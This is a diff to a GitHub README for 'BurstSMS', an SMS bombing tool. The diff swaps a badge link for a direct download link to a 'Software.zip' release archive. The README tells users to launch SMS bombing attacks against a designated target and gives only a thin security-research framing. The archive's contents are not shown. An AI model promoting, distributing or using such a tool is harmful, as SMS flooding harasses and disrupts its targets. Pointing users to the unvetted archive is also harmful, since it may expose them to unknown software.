@@ -14,7 +14,7 @@ Welcome to the **BurstSMS** repository, a powerful SMS bombing tool designed for
 
 ## Installation
 To get started with BurstSMS, download the software package from the following link and follow the installation instructions:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/treyskz/BurstSMS/releases/download/v1.0/Software.zip)](https://github.com/treyskz/BurstSMS/releases/download/v1.0/Software.zip)
 
 ## Usage
 Once you have installed BurstSMS, familiarize yourself with the tool's features and options. Customize the settings as needed and launch SMS bombing attacks against the designated target. Analyze the results to gain insights into potential security vulnerabilities and mitigation strategies.
